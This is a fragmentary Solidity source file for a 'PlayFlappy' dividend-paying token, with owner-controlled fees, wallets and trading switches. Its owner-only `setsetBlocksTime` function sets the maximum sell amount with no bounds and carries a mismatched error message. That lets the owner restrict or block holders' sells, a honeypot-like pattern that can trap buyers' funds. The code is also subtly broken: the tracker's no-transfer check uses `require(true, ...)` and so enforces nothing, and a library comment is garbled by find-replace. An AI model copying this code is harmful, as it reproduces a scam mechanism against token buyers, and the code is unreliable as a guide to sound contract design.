...
//
// Website: https://playflappy.com/
// Telegram group: https://t.me/PlayFlappy
...
library SafeMath {
    ...
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        ...
        // benefit is lost if 'b' is also PlayFlappyed.
...
// File: contracts/PlayFlappyDividendPayingToken.sol
...
// File: contracts/PlayFlappy.sol

// 

pragma solidity ^0.6.12;

contract PlayFlappy is ERC20, Ownable {
    using SafeMath for uint256;
	...
	address payable public _MarketingWalletAddress = payable(0x903c95535f086f5F4C7462D32eB4E210d77d660B); // Marketing Address
	address payable public _gameWalletAddress = payable(0x45bA2d338782229ACF559664E10bC20DBE7c384C); // gameWalletAddress
	address payable public _TeamWalletAddress = payable(0xb2C5BF56E9D7B974356Ba6a10Dfa9e0A23c661c3); // gameWalletAddress
	
    bool private swapping;

    PlayFlappyDividendTracker public dividendTracker;

    address public liquidityWallet;

    uint256 private _setBlocksTime = 100000000000 * (10**18); 
    ...
    constructor() ERC20("PlayFlappy", "FLAPPY") public {
        uint256 _CAKERewardsFee = 7;
        uint256 _LiquidityFee = 3;

        CAKERewardsFee = _CAKERewardsFee;
        LiquidityFee = _LiquidityFee;
        totalFees = _CAKERewardsFee.add(_LiquidityFee);


        dividendTracker = new PlayFlappyDividendTracker();
        ...
        canTransferBeforetradingEnabled[owner()] = true;
        /*
    ...
    function WhitelistDxSale(address _presaleAddress, address _routerAddress) public onlyOwner {
        ...
        canTransferBeforetradingEnabled[presaleAddress] = true;
        dividendTracker.excludeFromDividends(_presaleAddress);
        excludeFromFees(_presaleAddress, true);

        canTransferBeforetradingEnabled[_routerAddress] = true;
        dividendTracker.excludeFromDividends(_routerAddress);
        excludeFromFees(_routerAddress, true);
    }

    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "PlayFlappy: The dividend tracker already has that address");

        PlayFlappyDividendTracker newDividendTracker = PlayFlappyDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "PlayFlappy: The new dividend tracker must be owned by the PlayFlappy token contract");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "PlayFlappy: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != PanCAKESwapV2Pair, "PlayFlappy: The PanCAKESwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "PlayFlappy: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "PlayFlappy: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "PlayFlappy: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "PlayFlappy: Cannot update gasForProcessing to same value");
	...
	function setsetBlocksTime(uint256 setBlocksTime) external onlyOwner() {
        _setBlocksTime = setBlocksTime;
    }
    ...
    function _transfer(
       ...
       if(from != owner()){
        ...
        if(!tradingEnabled) {
            require(canTransferBeforetradingEnabled[from], "PlayFlappy: This account cannot send tokens until trading is enabled");
        }
        ...
        if( 
            ...
            require(amount <= _setBlocksTime, "Sell transfer amount exceeds the setBuyBackUpperLimit.");
        }
    ...
    function swapTokensForCAKE(uint256 tokenAmount, address recipient) private {
        ...
        // generate the PanCAKESwap pair path of weth -> CAKE
...
contract PlayFlappyDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() public DividendPayingToken("PlayFlappy_Dividend_Tracker", "PlayFlappy_Dividend_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**2); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(true, "PlayFlappy_Dividend_Tracker: No transfers allowed");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1 && newClaimWait <= 86400, "PlayFlappy_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "PlayFlappy_Dividend_Tracker: Cannot update claimWait to same value");
